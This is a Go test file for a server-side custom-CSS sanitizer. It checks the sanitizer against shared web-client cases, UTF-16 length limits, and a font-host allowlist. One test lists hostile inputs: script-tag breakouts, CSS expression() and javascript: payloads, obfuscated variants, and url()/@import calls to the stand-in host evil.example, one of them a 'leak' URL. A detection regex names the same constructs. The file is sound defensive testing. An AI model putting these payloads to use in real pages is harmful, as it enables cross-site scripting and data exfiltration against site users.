package domain

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"strings"
	"testing"
)

// cssCases mirrors web/src/theme/customCss.cases.json, whose expectations
// come from the web client's sanitizer: the server must agree with it.
type cssCases struct {
	CSS []struct {
		Input  *string `json:"input"`
		Repeat *struct {
			Prefix string `json:"prefix"`
			Unit   string `json:"unit"`
			Times  int    `json:"times"`
			Suffix string `json:"suffix"`
		} `json:"repeat"`
		Policy *struct {
			AllowExternalFonts bool     `json:"allowExternalFonts"`
			FontHosts          []string `json:"fontHosts"`
		} `json:"policy"`
		CSS       *string  `json:"css"`
		CSSLength *int     `json:"cssLength"`
		Rejected  bool     `json:"rejected"`
		Issues    []string `json:"issues"`
	} `json:"css"`
	Tokens []struct {
		Value       string  `json:"value"`
		AllowQuotes bool    `json:"allowQuotes"`
		Result      *string `json:"result"`
	} `json:"tokens"`
	Hosts []struct {
		Value  string  `json:"value"`
		Result *string `json:"result"`
	} `json:"hosts"`
}

func loadCSSCases(t *testing.T) cssCases {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "..", "web", "src", "theme", "customCss.cases.json"))
	if err != nil {
		t.Fatal(err)
	}
	var cases cssCases
	if err := json.Unmarshal(data, &cases); err != nil {
		t.Fatal(err)
	}
	if len(cases.CSS) < 80 || len(cases.Tokens) < 20 || len(cases.Hosts) < 10 {
		t.Fatalf("shared cases look truncated: %d %d %d", len(cases.CSS), len(cases.Tokens), len(cases.Hosts))
	}
	return cases
}

func TestCustomCSSMatchesWebClientSanitizer(t *testing.T) {
	cases := loadCSSCases(t)
	for i, c := range cases.CSS {
		var input string
		switch {
		case c.Input != nil:
			input = *c.Input
		case c.Repeat != nil:
			input = c.Repeat.Prefix + strings.Repeat(c.Repeat.Unit, c.Repeat.Times) + c.Repeat.Suffix
		default:
			t.Fatalf("case %d has no input", i)
		}
		var policy CSSPolicy
		if c.Policy != nil {
			policy = CSSPolicy{AllowExternalFonts: c.Policy.AllowExternalFonts, FontHosts: c.Policy.FontHosts}
		}
		got := SanitizeCustomCSS(input, policy)
		codes := []string{}
		for _, issue := range got.Issues {
			codes = append(codes, issue.Code)
			if utf16Length(issue.Excerpt) > 80 {
				t.Errorf("case %d: excerpt too long: %q", i, issue.Excerpt)
			}
		}
		name := cssExcerpt(input)
		if got.Rejected != c.Rejected || !reflect.DeepEqual(codes, c.Issues) {
			t.Errorf("case %d %q: rejected=%t issues=%v, web client: rejected=%t issues=%v", i, name, got.Rejected, codes, c.Rejected, c.Issues)
		}
		switch {
		case c.CSS != nil && got.CSS != *c.CSS:
			t.Errorf("case %d %q: css %q, web client %q", i, name, got.CSS, *c.CSS)
		case c.CSSLength != nil && utf16Length(got.CSS) != *c.CSSLength:
			t.Errorf("case %d %q: css length %d, web client %d", i, name, utf16Length(got.CSS), *c.CSSLength)
		}
	}
	for _, c := range cases.Tokens {
		got, ok := SanitizeTokenValue(c.Value, c.AllowQuotes)
		if ok != (c.Result != nil) || ok && got != *c.Result {
			t.Errorf("token %q: %q %t, web client %v", c.Value, got, ok, c.Result)
		}
	}
	for _, c := range cases.Hosts {
		got, ok := NormalizeFontHost(c.Value)
		if ok != (c.Result != nil) || ok && got != *c.Result {
			t.Errorf("host %q: %q %t, web client %v", c.Value, got, ok, c.Result)
		}
	}
}

// Nothing executable or remote may survive, whatever the input.
var cssInert = regexp.MustCompile(`(?i)<|\\|expression\s*\(|javascript:|vbscript:|@import|behavior|binding|image-set|https?:|//`)

func TestCustomCSSOutputIsInertForHostileInput(t *testing.T) {
	hostile := []string{
		"</style><script>alert(1)</script>",
		"a{color:red}</style><img src=x onerror=alert(1)>",
		"div { width: expression(alert(1)) }",
		"div { width: expr/**/ession(alert(1)) }",
		"div { background: url(javascript:alert(1)) }",
		"div { background: url(\"jav\tascript:alert(1)\") }",
		"div { background: url(https://evil.example/leak?c=1) }",
		"div { background: url( //evil.example/x ) }",
		"@import url(https://evil.example/x.css);",
		"@import 'https://evil.example/x.css'",
		"div { -moz-binding: url(/x.xml#xss) }",
		"div { behavior: url(/x.htc) }",
		"div { background-image: image-set(\"https://evil.example/x.png\" 1x) }",
		"div { background: u\\72l(https://evil.example/x) }",
		"@media screen { a { background: url(https://evil.example/x) } }",
		"@font-face { font-family: X; src: url(https://evil.example/x.woff2) }",
		"@supports (x: url(https://evil.example)) { a { color: red } }",
		"a[href^=\"https://\"] { color: red }",
		"div { content: \"x\" ; background : URL ( https://evil.example ) }",
		"div { background: url(https://evil.example/x.png) url(/ok.png) }",
		"div { background: url(/ok.png), url(https://evil.example/x.png) }",
		"div { background: url(/ok.png)url(https://evil.example/x.png) }",
		"@keyframes k { from { background: url(https://evil.example/x) } }",
	}
	for _, input := range hostile {
		for _, policy := range []CSSPolicy{{}, {AllowExternalFonts: true, FontHosts: []string{"fonts.example.com"}}} {
			got := SanitizeCustomCSS(input, policy)
			if cssInert.MatchString(got.CSS) {
				t.Errorf("%q kept active content: %q", input, got.CSS)
			}
			if !got.Rejected && len(got.Issues) == 0 && strings.Contains(strings.ToLower(input), "evil") {
				t.Errorf("%q passed without an issue: %q", input, got.CSS)
			}
		}
	}
	// An allowlisted font is the only remote reference that may survive.
	got := SanitizeCustomCSS("@font-face { font-family: X; src: url(https://fonts.example.com/x.woff2) }", CSSPolicy{AllowExternalFonts: true, FontHosts: []string{"fonts.example.com"}})
	if got.CSS != "@font-face{font-family:X;src:url(https://fonts.example.com/x.woff2)}" || len(got.Issues) != 0 {
		t.Fatalf("allowlisted font: %+v", got)
	}
}

func TestCustomCSSLengthCountsUTF16Units(t *testing.T) {
	// 32768 astral characters are 65536 UTF-16 units: exactly the limit.
	at := strings.Repeat("\U0001F600", CustomCSSMaxLength/2)
	if got := SanitizeCustomCSS(at, CSSPolicy{}); got.Rejected && got.Issues[0].Code == CSSIssueTooLong {
		t.Fatal("input at the limit was refused as too long")
	}
	if got := SanitizeCustomCSS(at+"a", CSSPolicy{}); !got.Rejected || got.Issues[0].Code != CSSIssueTooLong {
		t.Fatalf("input over the limit: %+v", got.Issues)
	}
	if utf16Length("aé\U0001F600") != 4 {
		t.Fatal("utf16 length")
	}
	if jsLower("İX") != "i̇x" || jsTrim("\u00a0\ufeff a \u3000") != "a" {
		t.Fatal("JavaScript string semantics")
	}
	if cssPrefix("aé", 2) != "a" || cssPrefix("ab", 5) != "ab" {
		t.Fatal("prefix cut inside a rune")
	}
}
